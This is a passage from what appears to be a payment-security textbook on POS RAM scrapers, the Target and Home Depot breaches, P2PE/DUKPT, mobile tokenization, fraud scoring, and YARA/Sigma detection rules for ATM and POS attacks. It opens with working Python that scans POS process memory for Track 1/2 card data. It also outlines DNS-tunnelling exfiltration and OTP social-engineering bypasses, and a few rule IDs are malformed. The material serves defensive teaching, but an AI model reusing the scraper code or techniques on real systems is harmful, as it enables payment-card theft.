            offset = mbi.BaseAddress
            while offset < region_end:
                bytes_read = ctypes.c_size_t(0)
                read_size = min(4096, region_end - offset)
                success = kernel32.ReadProcessMemory(
                    handle, offset, buf, read_size, ctypes.byref(bytes_read)
                )
                if success and bytes_read.value > 0:
                    chunk = buf.raw[:bytes_read.value]

                    # Search for Track 2 pattern
                    for match in TRACK2_PATTERN.finditer(chunk):
                        pan = match.group(1).decode()
                        if luhn_check(pan):
                            found_tracks.append({
                                "type":    "Track2",
                                "pan":     pan,
                                "expiry":  match.group(2).decode(),
                                "service": match.group(3).decode(),
                            })

                    # Search for Track 1 pattern
                    for match in TRACK1_PATTERN.finditer(chunk):
                        pan = match.group(1).decode()
                        if luhn_check(pan):
                            found_tracks.append({
                                "type":    "Track1",
                                "pan":     pan,
                                "name":    match.group(2).decode(),
                                "expiry":  match.group(3).decode(),
                                "service": match.group(4).decode(),
                            })

                offset += read_size

        address = mbi.BaseAddress + mbi.RegionSize

    kernel32.CloseHandle(handle)
    return found_tracks
```

The malware typically runs in an infinite loop, calling this scanning function every 100–500 milliseconds against the POS application process (`pos.exe`, `aloha.exe`, `micros.exe`, etc.). Captured data is accumulated in a local file or memory buffer, then exfiltrated periodically.

### 4.3 Notable RAM scrapers

**BlackPOS (Kaptoxa, 2013–2014).** Responsible for the Target Corporation breach (40 million card numbers stolen, disclosed December 2013). BlackPOS was deployed on Target's POS terminals via the HVAC vendor's VPN credentials (the HVAC contractor had remote access to Target's network for building-management systems; the attackers compromised the contractor and used the VPN to reach the POS network segment). BlackPOS scanned the `pos.exe` process memory, captured Track 1/2 data, wrote it to a local file (`output.txt`), and a second component (`blat.exe`, a command-line email tool) or a custom exfiltration script moved the data to a staging server within Target's network, then out to the attacker's external server via FTP.

**Kill chain reconstruction and IOCs.** Phase 1 — Initial access (November 2013): compromise of Fazio Mechanical (HVAC vendor) via phishing email containing Citadel banking trojan. Phase 2 — Lateral movement: use of stolen Fazio credentials to access Target's vendor portal, then pivot to the internal network via inadequate segmentation between the vendor portal and the cardholder data environment (CDE). Phase 3 — POS deployment (November 15–27, 2013): BlackPOS binary (``mmon.exe`, MD5: `aefc02d9ab56db38d300e7fd2b2da8e3`) deployed to 1,797 POS terminals via Target's own SCCM (System Center Configuration Manager) infrastructure — the attackers used the POS management system to push malware to every terminal. Phase 4 — Exfiltration: data staged on internal servers (`10.116.240.x` range), then exfiltrated to external FTP servers (IPs in Russia). Phase 5 — Discovery: FireEye alerts triggered on December 2, 2013; Target confirmed breach on December 15.

**Dexter (2012–2013).** A modular RAM scraper with C2 capability. Dexter communicated with a C2 server via HTTP POST, exfiltrating captured track data. It supported multiple POS applications (searching multiple process names). Dexter included anti-analysis features: checking for VM environments (VMware, VirtualBox strings in the registry/BIOS).

**Alina (2012–2016).** Used DNS tunneling for exfiltration — track data was encoded in DNS queries to the attacker's authoritative DNS server. This bypassed network-level monitoring that looked for HTTP/HTTPS exfiltration but did not inspect DNS content.

**FrameworkPOS (2014).** Infected The Home Depot's POS systems (56 million card numbers, disclosed September 2014). FrameworkPOS exfiltrated data via DNS queries — each captured card number was encoded as a subdomain label in a DNS query to the attacker's domain. The DNS server extracted the card data from the query labels. DNS-based exfiltration was chosen because DNS traffic was permitted through the firewall without inspection.

### 4.4 YARA and Sigma rules for POS RAM scrapers

**YARA rule for generic RAM scraper detection:**

```yara
rule POS_RAM_Scraper_Generic {
    meta:
        description = "Detects POS RAM scraper malware by memory scanning API patterns"
        date        = "2024-01-15"
    strings:
        // Windows API calls for process memory scanning
        $api_open    = "OpenProcess" ascii
        $api_read    = "ReadProcessMemory" ascii
        $api_query   = "VirtualQueryEx" ascii
        $api_enum    = "EnumProcesses" ascii
        $api_snap    = "CreateToolhelp32Snapshot" ascii

        // Track data indicators
        $track1_sentinel = "%B" ascii
        $track2_sentinel = { 3B }   // ";" in hex
        $track_sep       = { 3D }   // "=" in hex (Track 2 separator)
        $luhn_indicator  = "Luhn" ascii nocase

        // Common POS process names targeted by scrapers
        $pos_proc_1 = "pos.exe" ascii nocase
        $pos_proc_2 = "aloha.exe" ascii nocase
        $pos_proc_3 = "micros.exe" ascii nocase
        $pos_proc_4 = "sqlservr.exe" ascii nocase

        // Exfiltration indicators
        $exfil_dns   = "DnsQuery" ascii
        $exfil_ftp   = "ftp://" ascii nocase
        $exfil_http  = "POST" ascii

    condition:
        uint16(0) == 0x5A4D and
        2 of ($api_open, $api_read, $api_query, $api_enum, $api_snap) and
        1 of ($track1_sentinel, $track2_sentinel) and
        1 of ($pos_proc_1, $pos_proc_2, $pos_proc_3, $pos_proc_4) and
        1 of ($exfil_dns, $exfil_ftp, $exfil_http)
}
```

**Sigma rule for DNS tunneling exfiltration (Alina/FrameworkPOS pattern):**

```yaml
title: POS Malware DNS Tunneling Exfiltration
id: f8gc26e5-9h7i-4f4d-de6h-1c7j8k9l0m1n
status: experimental
description: Detects DNS queries with encoded card data in subdomain labels
date: 2024-01-15
logsource:
    category: dns_query
    product: windows
detection:
    selection:
        QueryName|re: '(?:[a-f0-9]{26,40}\.){1,4}[a-z0-9-]+\.[a-z]{2,6}'
    filter_legitimate:
        QueryName|endswith:
            - '.microsoft.com'
            - '.windowsupdate.com'
            - '.googleapis.com'
    condition: selection and not filter_legitimate
level: high
tags:
    - attack.exfiltration
    - attack.t1048.003
```

**Sigma rule for abnormal process memory access (RAM scraping behavior):**

```yaml
title: POS RAM Scraper Process Memory Access
id: 09hd37f6-0i8j-4g5e-ef7i-2d8k9l0m1n2o
status: experimental
description: Detects a process reading memory of known POS applications
date: 2024-01-15
logsource:
    category: process_access
    product: windows
detection:
    selection:
        GrantedAccess|contains:
            - '0x0010'   # PROCESS_VM_READ
            - '0x1F0FFF' # PROCESS_ALL_ACCESS
        TargetImage|endswith:
            - '\pos.exe'
            - '\aloha.exe'
            - '\micros.exe'
            - '\ncrpos.exe'
    filter_legitimate:
        SourceImage|endswith:
            - '\MsMpEng.exe'        # Windows Defender
            - '\SolidcoreCmd.exe'   # McAfee Application Control
    condition: selection and not filter_legitimate
level: critical
```

### 4.5 PCI DSS requirements mapping per attack type

| Attack Vector | PCI DSS v4.0 Requirement | Control |
|--------------|--------------------------|---------|
| RAM scraping | Req 6.2.4 — Software attack protection | Application whitelisting, code integrity verification |
| RAM scraping | Req 11.5.1 — Intrusion detection | IDS/IPS monitoring for scraper behaviors |
| Network exfiltration | Req 1.3.1 — Restrict CDE traffic | Firewall rules blocking direct outbound from POS |
| DNS tunneling exfil | Req 1.3.2 — Restrict outbound CDE traffic | DNS inspection/filtering, restrict DNS to internal resolvers |
| Credential theft (vendor access) | Req 8.3.6 — MFA for remote access | MFA on all vendor remote access connections |
| Lateral movement | Req 1.2.1 — Network segmentation | Isolate CDE from corporate/vendor networks |
| Missing encryption | Req 4.2.1 — Strong cryptography for PAN in transit | P2PE (§4.6), TLS for all network transmission |
| Insufficient monitoring | Req 10.4.1 — Audit log review | Automated log analysis, SIEM correlation |

### 4.6 Defense: P2PE (Point-to-Point Encryption)

P2PE encrypts card data at the earliest possible point — inside the card reader or PIN pad's tamper-resistant boundary — before it enters the POS application's memory. The POS application receives only the encrypted card data (ciphertext); it forwards this to the payment processor, who decrypts it in their HSM. The cleartext card data never exists in the POS terminal's RAM.

P2PE implementation: the card reader contains an encryption module (a secure cryptoprocessor with a DUKPT — Derived Unique Key Per Transaction — or AES-DUKPT key hierarchy). Each transaction uses a unique encryption key derived from a base key injected during manufacturing. The ciphertext includes a Key Serial Number (KSN) that the processor uses to derive the matching decryption key.

**DUKPT key derivation — step by step.** DUKPT (ANSI X9.24-3) generates a unique key for each transaction without transmitting keys or reusing them:

(1) During key injection, the Base Derivation Key (BDK, 128-bit for 3DES-DUKPT, 128/192/256-bit for AES-DUKPT) and an initial Key Serial Number (KSN, 80 bits for 3DES, 96 bits for AES) are loaded into the device. The KSN consists of a Key Set ID (identifying the BDK), a Device ID (unique per terminal), and a Transaction Counter (initially zero).

(2) The Initial PIN Encryption Key (IPEK) is derived: `IPEK_left = 3DES_encrypt(BDK, KSN_with_counter_zeroed)` and `IPEK_right = 3DES_encrypt(BDK XOR 0xC0C0C0C000000000C0C0C0C000000000, KSN_with_counter_zeroed)`. The IPEK is the concatenation of the left and right halves.

(3) From the IPEK, a tree of Future Keys is derived. The device pre-computes 21 future keys (for 3DES-DUKPT) using a binary tree derivation: each bit of the transaction counter selects a derivation path. The device stores these 21 future keys in its tamper-resistant memory. The BDK and IPEK are then erased from the device — they are not needed for future key derivation.

(4) For each transaction, the device selects the appropriate future key based on the current transaction counter value, derives a transaction-specific working key (PIN encryption key, MAC key, or data encryption key) by applying a specific derivation constant, encrypts the data, increments the counter, and derives the next set of future keys.

(5) The receiving HSM, which possesses the BDK, derives the same transaction key by performing the same derivation from BDK → IPEK → future key → working key, using the KSN transmitted with the encrypted data.

**AES-DUKPT** (ANSI X9.24-3:2017) replaces 3DES-DUKPT with AES-256 derivation, supporting AES-128, AES-192, and AES-256 working keys. The derivation uses AES-CMAC instead of 3DES encryption, and the KSN is extended to 96 bits (supporting a larger transaction counter). AES-DUKPT is mandated for new deployments as 3DES approaches end-of-life (NIST deprecated 3DES in 2023, with a disallow-after date of 2028).

P2PE eliminates the RAM-scraper attack surface: there is no cleartext track data in memory for the malware to capture. PCI DSS validates P2PE implementations under the P2PE Standard; merchants using a PCI-validated P2PE solution have reduced PCI scope.

### 4.7 POS defense architecture

**Network segmentation.** POS terminals must reside in a dedicated network segment (CDE — Cardholder Data Environment) isolated from the corporate network, guest WiFi, and back-office systems. Firewall rules: POS terminals communicate only with the payment processor (specific IP/port), the POS management server (for software updates and configuration), and NTP. All other traffic is blocked — particularly outbound DNS to external resolvers (force POS DNS through an internal resolver with query logging) and outbound HTTP/HTTPS (eliminates direct C2 and web-based exfiltration).

**Application whitelisting.** Identical in principle to ATM whitelisting (§1.5): baseline the POS terminal's legitimate software and block all unsigned/unapproved executables. POS terminals should never run general-purpose applications (web browsers, email clients, office software).

**Endpoint monitoring.** Deploy lightweight EDR or Sysmon on POS terminals with rules focused on: process memory access across process boundaries (the RAM scraping technique), unusual process creation (anything not in the whitelist), outbound network connections to unexpected destinations, and DNS query patterns indicative of tunneling.

---

## 5. Mobile payment tokenization — expanded

### 5.1 Provisioning

When a user adds a card to Apple Pay: (1) the user enters the card number (or the bank's app sends it via in-app provisioning). (2) The device sends the PAN to the card network's Token Service Provider (TSP — MDES for Mastercard, VTS for Visa). (3) The TSP verifies the card with the issuer (via ID&V — Identification and Verification: the issuer may require additional authentication — OTP via SMS, in-app authentication, or customer-service call). (4) The TSP generates a DPAN (Device PAN — a token that maps to the real PAN in the TSP's token vault). (5) The TSP provisions the DPAN and a set of single-use payment keys to the device's secure element (Apple: the Secure Enclave; Google: Host Card Emulation with cloud-based keys or embedded SE). (6) The device is now ready to make payments with the DPAN.

### 5.2 DPAN provisioning protocol flow

The provisioning protocol involves multiple parties communicating via REST APIs:

**Step 1 — Enrollment request.** The device (via the wallet app) sends a provisioning request to the TSP. For Mastercard MDES, the request payload includes: encrypted card data (PAN, expiration, CVV2 — encrypted using the TSP's public key), device information (device ID, device type, OS version, SE/HCE capability), wallet provider ID (Apple, Google, Samsung), and user authentication data (device account holder verification).

**Step 2 — Issuer ID&V.** The TSP forwards the request to the issuer's Token Requestor Service (TRS). The issuer evaluates the risk (device reputation, account history, geolocation) and responds with one of: (a) `APPROVED` — no additional verification needed (green path), (b) `REQUIRE_ADDITIONAL_AUTHENTICATION` — the issuer requires the cardholder to complete an additional verification step (yellow path — OTP via SMS, email, phone call, or in-app push notification), or (c) `DECLINED` — the issuer refuses tokenization (red path — stolen card, sanctioned account).

**Step 3 — Token generation.** Upon approval, the TSP generates the DPAN (a 16-digit number in the same BIN range as the original PAN but with a distinct token-range indicator). The TSP stores the mapping `DPAN → real PAN` in its token vault (a highly secured database with HSM-protected encryption keys). The TSP also generates the token expiration date (which may differ from the real card's expiration) and a set of Limit Key (LUK — Limited Use Key) session keys.

**Step 4 — Provisioning to device.** The TSP sends the DPAN, LUK keys, and associated metadata to the device via the wallet provider's provisioning infrastructure. For Apple Pay, this is delivered via Apple's APNs (Apple Push Notification Service) to the Secure Element. For Google Pay HCE, the keys are stored in the Google Pay cloud backend and delivered to the device on demand.

### 5.3 Token cryptogram generation

At the time of payment, the device generates a payment cryptogram (also called the Token Cryptogram or dynamic CVV) that proves the transaction was initiated by the authorized device with the authorized user's biometric/PIN:

The cryptogram input includes: the DPAN, the current LUK, a transaction counter (ATC — Application Transaction Counter), the transaction amount (for some schemes), and an unpredictable number. The cryptogram is computed as an HMAC or AES-based MAC over these inputs using the LUK. The resulting cryptogram is a single-use value — even if intercepted, it cannot be replayed because the ATC has incremented and the LUK may have been rotated.

For Visa (VTS), the cryptogram is placed in the EMV tag `9F26` (Application Cryptogram) in the contactless transaction data, mimicking a standard EMV ARQC. The TSP, when detokenizing, validates the cryptogram using the same LUK and transaction data. For Mastercard (MDES), a similar mechanism produces the UCAF (Universal Cardholder Authentication Field) cryptogram in the online authorization message.

### 5.4 HCE vs SE — security comparison

**Secure Element (SE) — Apple Pay, Samsung Pay (older models).** The SE is a tamper-resistant hardware chip (either embedded in the device's SoC or on a discrete chip) that stores the DPAN and LUK keys. The SE has its own processor, operating system (typically MULTOS or JavaCard), and secure storage. Keys stored in the SE cannot be extracted even with root/jailbreak access to the device's main OS. The SE communicates with the NFC controller directly — the payment credentials never pass through the device's main application processor or OS kernel.

Attack surface: physical side-channel attacks on the SE chip (power analysis, electromagnetic analysis — requires physical possession and sophisticated lab equipment), or exploitation of the SE's operating system (extremely rare — SE operating systems have a very small attack surface and undergo Common Criteria EAL5+ certification). Practical risk: very low.

**Host Card Emulation (HCE) — Google Pay.** HCE does not use a dedicated hardware secure element. Instead, the DPAN and LUK keys are stored in software — either in the device's Trusted Execution Environment (TEE, e.g., ARM TrustZone — a hardware-isolated execution environment but not a dedicated SE), or in Google's cloud backend (the keys are downloaded to the device just before a transaction and cached temporarily).

Attack surface: malware with root access on the device's main OS could potentially access the TEE's interface or intercept keys during the download-and-cache phase. A compromised device OS could install a rogue NFC application that intercepts the HCE transaction. Google mitigates this with: (a) attestation — the device's TEE attests its integrity to Google's servers before keys are provisioned, (b) limited-use keys — each LUK is valid for a small number of transactions or a short time window, limiting the impact of key compromise, (c) device binding — the LUK is bound to the device's hardware attestation key, so keys stolen from one device cannot be used on another.

**Security comparison summary:**

| Property | SE (Apple Pay) | HCE (Google Pay) |
|----------|---------------|-------------------|
| Key storage | Dedicated tamper-resistant chip | TEE / cloud-cached |
| Key extraction resistance | Very high (physical attacks only) | Moderate (root + TEE exploit) |
| Offline capability | Full (keys always in SE) | Limited (keys may need cloud refresh) |
| Relay attack resistance | SE-to-NFC direct path, no OS interception | OS-mediated, theoretically interceptable |
| Certification | Common Criteria EAL5+ | TEE: EAL2-4, varies by device |

### 5.5 Token domain restriction attacks

The DPAN is domain-restricted — it is valid only for a specific set of conditions: the specific device, the specific wallet provider, the specific merchant category (in some configurations), and the specific transaction type (contactless POS, in-app, e-commerce). If an attacker obtains a DPAN and attempts to use it outside its authorized domain (e.g., using a contactless-POS-only DPAN for an e-commerce transaction), the TSP rejects the transaction during detokenization.

Attack: the attacker captures a DPAN and cryptogram from an NFC transaction (via eavesdropping or relay) and attempts to use it for a card-not-present (CNP) e-commerce transaction. Defense: the TSP checks the transaction's presentment mode against the token's domain restriction and rejects mismatches. The dynamic cryptogram is also bound to the transaction context, preventing cross-domain reuse.

### 5.6 NFC relay attack on mobile payments

An NFC relay attack on mobile payments works similarly to the EMV contactless relay (Chapter 22A §6.2): the attacker places a reader device near the victim's phone (which has an active NFC wallet), relays the NFC communication to a second device at a remote POS terminal, and the remote device emulates the victim's phone to complete a transaction.

**Tools.** NFCGate (Android-based relay tool), custom relay hardware using PN532 NFC modules with Bluetooth or WiFi bridges. The relay introduces latency (10–50ms per exchange over WiFi), which some EMV contactless implementations detect via timing checks.

**Detection and defense.** (1) Transaction notifications — the victim's wallet app displays a payment notification; if the victim did not initiate the payment, they can immediately report fraud. (2) User authentication — Apple Pay requires Face ID/Touch ID for each transaction; an attacker cannot initiate a relay without the victim actively authenticating (the phone's NFC payment feature is only active for a short window after authentication). Google Pay allows small transactions without unlock (transit mode), which is the higher-risk scenario. (3) Distance bounding — the EMV contactless protocol can include timing measurements that detect relay latency, though this is not universally implemented. (4) Behavioral analytics — the issuer's fraud system flags transactions that are geographically inconsistent with the device's last known location.

### 5.7 Samsung Pay — MST

Samsung Pay uniquely supports both NFC and MST (Magnetic Secure Transmission). MST emits a magnetic field from the phone that mimics a magnetic stripe swipe — allowing Samsung Pay to work on older terminals that only have magnetic stripe readers (no NFC). The MST transmission includes a tokenized track data with a dynamic cryptogram (the DPAN + dynamic CVV), so it provides the same security as NFC-based tokenized payments. MST is being phased out (Samsung discontinued MST in newer models from 2022+).

---

## 6. Payment fraud detection engineering

### 6.1 Transaction monitoring rules

Real-time transaction monitoring is the last line of defense when preventive controls (EMV, P2PE, tokenization) fail or are bypassed. The monitoring system evaluates each transaction against a set of rules and scores before approving or declining it:

**Velocity checks.** Count the number of transactions per PAN, per terminal, per merchant, or per device within a time window. Examples: more than 5 transactions on the same PAN within 10 minutes (card testing attack — the attacker is probing whether stolen card data is valid), more than 3 declined transactions followed by an approval (brute-force PIN or CVV guessing), total transaction amount exceeding $5,000 on a single PAN within 24 hours (structuring or rapid cash-out).

**Geofencing and velocity of travel.** If a card is used at a POS terminal in New York at 14:00 and at an ATM in London at 14:30, the physical distance is impossible to traverse in 30 minutes. The fraud system computes the "velocity of travel" (distance between consecutive transactions divided by time elapsed) and flags transactions that exceed physically possible speeds (typically >900 km/h, accounting for air travel). For tokenized mobile payments, the device's GPS location can supplement the terminal's location for more precise geofencing.

**Device fingerprinting.** For card-not-present (CNP) transactions (e-commerce), the fraud system collects the customer's device attributes: browser User-Agent, screen resolution, installed fonts, timezone, IP address (and its geolocation, ASN, and whether it is a known VPN/proxy/Tor exit node), canvas fingerprint, WebGL renderer, and cookies/local storage identifiers. A transaction from a device that has never been associated with the cardholder, especially from a high-risk IP (VPN, Tor, hosting provider), receives a higher fraud score.

**Merchant category anomalies.** A cardholder who typically makes grocery and gas purchases suddenly makes a $3,000 purchase at an electronics store — the fraud system flags the category deviation. Similarly, transactions at merchants known for high fraud rates (certain online electronics retailers, cryptocurrency exchanges, gift card sellers) receive elevated scrutiny.

### 6.2 Machine learning fraud scoring

Modern fraud detection systems combine rule-based checks with machine learning models that assign a continuous fraud probability score (0.0–1.0) to each transaction:

**Feature engineering for payment fraud.** The ML model's input features are derived from the raw transaction data and enriched with historical behavioral data:

- **Transaction features:** amount, currency, merchant category code (MCC), POS entry mode (chip/contactless/mag-stripe/manual), time of day, day of week, whether the transaction is domestic or cross-border.
- **Velocity features:** count and sum of transactions in the last 1 hour, 6 hours, 24 hours, 7 days. Count of distinct merchants, cities, countries in the same windows. Count of declined transactions in recent windows.
- **Behavioral deviation features:** z-score of current transaction amount relative to the cardholder's historical mean and standard deviation. Distance from cardholder's home/work address. Time since last transaction. Whether this merchant has been used before.
- **Device/channel features (CNP):** new device indicator, device age (first seen), IP risk score, email domain age, shipping-to-billing address match.
- **Network graph features:** whether the card, device, email, phone number, or shipping address is connected (via shared attributes) to known fraud rings.

**Model architecture.** Gradient-boosted decision trees (XGBoost, LightGBM) remain the dominant approach for tabular fraud data due to their ability to handle mixed feature types, missing values, and highly imbalanced classes (fraud is typically 0.05–0.1% of transactions). Deep learning models (autoencoders for anomaly detection, recurrent networks for sequential transaction patterns) are used as supplementary models. Ensemble scoring (combining multiple model outputs) is common.

**Real-time vs batch detection.** Real-time scoring occurs inline during transaction authorization — the fraud model must return a score within 50–100ms to avoid adding perceptible latency to the payment flow. Batch detection runs post-authorization, analyzing the day's transactions for patterns that single-transaction scoring might miss (coordinated multi-card attacks, slow-burn account takeover). Batch-detected fraud triggers card blocks, customer notifications, and retroactive chargebacks.

### 6.3 EMV 3D-Secure 2.0

3D-Secure 2.0 (3DS2, branded as "Visa Secure" and "Mastercard Identity Check") adds an authentication layer to card-not-present (CNP) e-commerce transactions:

**Protocol flow.** (1) The cardholder initiates checkout on a merchant's website. (2) The merchant's payment page collects device/browser data and sends it to the merchant's acquirer. (3) The acquirer sends an Authentication Request (AReq) to the card network's Directory Server (DS). (4) The DS routes the AReq to the issuer's Access Control Server (ACS). (5) The ACS evaluates the transaction risk using the device data, cardholder history, and its own risk engine. (6) If the ACS determines the transaction is low-risk, it returns a "frictionless" authentication (no cardholder challenge — the authentication is invisible to the user). If high-risk, the ACS issues a challenge: a one-time password (OTP via SMS/email), biometric authentication (fingerprint, face recognition via the issuer's app), or a push notification to the issuer's banking app. (7) The authentication result (ARes) is returned to the merchant and included in the authorization message (DE55 or a dedicated 3DS field).

**Bypass techniques.** (1) **Downgrade to 3DS1 or no-3DS:** if the merchant does not enforce 3DS2, the attacker uses stolen card data at merchants that do not participate in 3DS. Defense: issuers can configure "soft decline" — rejecting non-3DS transactions and returning a response code that instructs the merchant to retry with 3DS authentication. (2) **Social engineering the OTP:** the attacker phones the cardholder, posing as the bank, and requests the OTP that was just sent via SMS ("we detected a suspicious transaction, please confirm the code we sent"). Defense: issuers must use push-notification or biometric challenges (which cannot be verbally relayed) for high-risk transactions. (3) **SIM swapping:** the attacker takes over the cardholder's phone number, receiving the OTP SMS directly. Defense: issuers should deprioritize SMS-based OTP in favor of app-based push notifications, which are bound to the installed app, not the phone number.

### 6.4 Sigma rules for payment infrastructure anomalies

```yaml
title: Anomalous Authorization Approval Rate Spike
id: 1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p
status: experimental
description: Detects a sudden increase in approval rate for a specific BIN range or terminal
date: 2024-01-15
logsource:
    category: application
    product: payment_switch
detection:
    selection:
        mti: '0110'
        response_code: '00'
    baseline:
        approval_rate|gt: '0.95'  # normal approval rate ~85-90%
    timeframe: 1h
    condition: selection | count() by terminal_id > baseline
level: high
tags:
    - attack.initial_access
    - attack.t1190
```

```yaml
title: Suspicious After-Hours Batch Authorization Activity
id: 2b3c4d5e-6f7g-8h9i-0j1k-2l3m4n5o6p7q
status: experimental
description: Detects batch authorization requests outside normal business hours
date: 2024-01-15
logsource:
    category: application
    product: payment_switch
detection:
    selection:
        mti: '0100'
    filter_time:
        timestamp|re: 'T(0[0-5]|2[2-3]):'  # 22:00-05:59
    filter_velocity:
        count|gt: 50
    timeframe: 30m
    condition: selection and filter_time and filter_velocity
level: medium
tags:
    - attack.collection
    - attack.t1119
```

---

## 7. ATM/POS detection engineering

This section consolidates detection rules specific to ATM and POS attack patterns. The Sigma and YARA rules below complement the per-malware detection signatures in §2 (which target specific families) and the payment-switch anomaly rules in §6.4 (which target ISO 8583 approval-rate deviations). The rules here focus on behavioral indicators — attack patterns observable across malware families and attack techniques.

### 7.1 Sigma rules: ATM cash-out patterns

**Rapid sequential withdrawal detection.** ATM cash-out operations (whether via jackpotting malware, compromised cards, or FASTCash-style switch manipulation) share a common observable: the same ATM dispenses cash at an abnormally high rate. Legitimate ATM usage averages 3–8 transactions per hour during peak hours; a cash-out attack can produce 20–60 dispense events per hour from a single terminal. The key detection data source is the ATM's XFS journal or the host-side transaction log.

```yaml
title: Rapid Sequential ATM Cash Withdrawals from Single Terminal
id: 7a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: >
    Detects a single ATM terminal processing an abnormal number of cash
    withdrawal transactions within a short window, indicative of jackpotting,
    FASTCash-style cash-out, or compromised-card fraud ring activity.
date: 2025-03-10
author: Payment Security Operations
references:
    - https://www.europol.europa.eu/operations/jackpotting
    - https://us-cert.cisa.gov/ncas/alerts/aa20-239a
logsource:
    category: application
    product: atm_host
detection:
    selection:
        event_type: 'withdrawal_completed'
        dispense_status: 'success'
    timeframe: 30m
    condition: selection | count() by terminal_id > 15
level: high
tags:
    - attack.collection
    - attack.t1005
    - atm.cashout
falsepositives:
    - High-traffic ATMs in transport hubs during holiday periods
    - Bulk cash-logistics operations (ATM cassette swap mislogged)
```

**Sequential withdrawals at maximum dispense limit.** Jackpotting attacks consistently request the maximum dispense amount per transaction (the ATM's per-transaction limit, typically $500–$1,000 or equivalent). Legitimate customers rarely hit this limit repeatedly.

```yaml
title: Repeated Maximum-Amount ATM Withdrawals
id: 8b2c3d4e-5f6a-7b8c-9d0e-1f2a3b4c5d6e
status: experimental
description: >
    Detects repeated withdrawals at or near the per-transaction maximum
    dispense limit from a single terminal. Jackpotting malware and cash-out
    mule operations consistently request the ceiling amount.
date: 2025-03-10
logsource:
    category: application
    product: atm_host
detection:
    selection:
        event_type: 'withdrawal_completed'
        amount|gte: '$MAX_DISPENSE_THRESHOLD'  # configure per institution
    timeframe: 1h
    condition: selection | count() by terminal_id > 5
level: high
tags:
    - attack.collection
    - atm.cashout
```

### 7.2 Sigma rules: XFS API abuse indicators

The rules in §2 detect specific malware loading `msxfs.dll`. The rules here detect behavioral patterns in XFS API usage that indicate abuse regardless of which malware family (or custom tool) is responsible.

**XFS dispense command without preceding card-read and PIN-entry sequence.** In legitimate ATM operation, a cash withdrawal follows a strict sequence: card insertion → card read (`WFS_CMD_IDC_READ_RAW_DATA`) → PIN entry (`WFS_CMD_PIN_GET_PIN`) → host authorization → dispense (`WFS_CMD_CDM_DISPENSE`) → present (`WFS_CMD_CDM_PRESENT`). Jackpotting malware skips the card-read and PIN-entry steps entirely.

```yaml
title: ATM Dispense Command Without Card-Read/PIN Sequence
id: 9c3d4e5f-6a7b-8c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: >
    Detects XFS dispense commands issued without a preceding card-read
    and PIN-entry event within the expected transaction window. All known
    ATM jackpotting malware (Ploutus, Cutlet Maker, Tyupkin, GreenDispenser,
    WinPot) bypasses the card/PIN sequence when dispensing.
date: 2025-03-10
logsource:
    product: windows
    service: application
detection:
    selection_dispense:
        EventID: 1000
        Message|contains:
            - 'WFS_CMD_CDM_DISPENSE'
            - 'WFS_CMD_CDM_PRESENT'
    filter_card_pin:
        Message|contains:
            - 'WFS_CMD_IDC_READ_RAW_DATA'
            - 'WFS_CMD_PIN_GET_PIN'
    timeframe: 2m
    condition: selection_dispense and not filter_card_pin
level: critical
tags:
    - attack.execution
    - attack.t1106
    - atm.jackpotting
falsepositives:
    - ATM maintenance diagnostic dispense tests (should be during scheduled windows only)
```

**XFS service provider enumeration burst.** Before dispensing, many ATM malware families enumerate all installed XFS service providers to identify the dispenser's logical name. This produces a burst of `WFSGetInfo` calls across multiple service classes (`CDM`, `IDC`, `PIN`, `SIU`) within seconds — a pattern not seen during normal ATM application startup, which enumerates once and caches the results.

```yaml
title: XFS Service Provider Enumeration Burst
id: 0d4e5f6a-7b8c-9d0e-1f2a-3b4c5d6e7f8a
status: experimental
description: >
    Detects rapid enumeration of multiple XFS service providers, indicating
    malware probing ATM peripherals to identify the cash dispenser.
date: 2025-03-10
logsource:
    product: windows
    service: application
detection:
    selection:
        EventID: 1000
        Message|contains: 'WFSGetInfo'
    filter_startup:
        ProcessName|endswith:
            - '\APTRA\bin\aptra.exe'
            - '\Agilis\Agilis.exe'
            - '\MoniMax\MoniMax.exe'
    timeframe: 30s
    condition: selection | count() > 8 and not filter_startup
level: high
tags:
    - attack.discovery
    - attack.t1082
    - atm.recon
```

### 7.3 Sigma rules: POS memory scraping process behavior

POS RAM scrapers (§4) share common behavioral fingerprints: they enumerate running processes, open process handles with `PROCESS_VM_READ` access, and scan memory regions for Track 1/Track 2 patterns. The rules below detect these behaviors at the endpoint level.

**Process memory scanning with Track data regex.** RAM scrapers use `ReadProcessMemory` and search for patterns matching Track 1 (`%B[0-9]{13,19}\^`) or Track 2 (`;[0-9]{13,19}=`). Sysmon Event ID 10 (ProcessAccess) captures the access-rights mask; `PROCESS_VM_READ` (0x0010) combined with `PROCESS_QUERY_INFORMATION` (0x0400) from a non-POS-application process is the key indicator.

```yaml
title: POS RAM Scraper Process Memory Access Pattern
id: 1e5f6a7b-8c9d-0e1f-2a3b-4c5d6e7f8a9b
status: experimental
description: >
    Detects a process opening handles to POS application processes with
    PROCESS_VM_READ access rights, characteristic of RAM scraper malware
    (BlackPOS, Dexter, Alina, FrameworkPOS, Backoff, PoSeidon).
date: 2025-03-10
logsource:
    category: process_access
    product: windows
detection:
    selection:
        GrantedAccess|contains:
            - '0x0410'   # PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
            - '0x1410'   # above + PROCESS_QUERY_LIMITED_INFORMATION
            - '0x001FFFFF'  # PROCESS_ALL_ACCESS
        TargetImage|endswith:
            - '\pos.exe'
            - '\aloha.exe'          # NCR Aloha POS
            - '\micros.exe'         # Oracle MICROS
            - '\rpower.exe'
            - '\VeriFone.PAYware.exe'
    filter_legitimate:
        SourceImage|endswith:
            - '\MsMpEng.exe'        # Windows Defender
            - '\SentinelAgent.exe'  # SentinelOne
            - '\cb.exe'             # CrowdStrike
    condition: selection and not filter_legitimate
level: critical
tags:
    - attack.credential_access
    - attack.t1005
    - pos.scraper
```

**Suspicious process creating outbound connections from POS terminal.** POS terminals typically communicate only with the payment processor endpoint and the store's management network. RAM scrapers exfiltrate stolen track data via HTTP POST, DNS tunneling, or FTP to attacker-controlled infrastructure.

```yaml
title: POS Terminal Unexpected Outbound Network Connection
id: 2f6a7b8c-9d0e-1f2a-3b4c-5d6e7f8a9b0c
status: experimental
description: >
    Detects outbound network connections from a POS terminal to destinations
    outside the authorized payment processor and management network ranges.
    POS scrapers exfiltrate track data to external C2 infrastructure.
date: 2025-03-10
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Initiated: 'true'
    filter_authorized:
        DestinationIp|cidr:
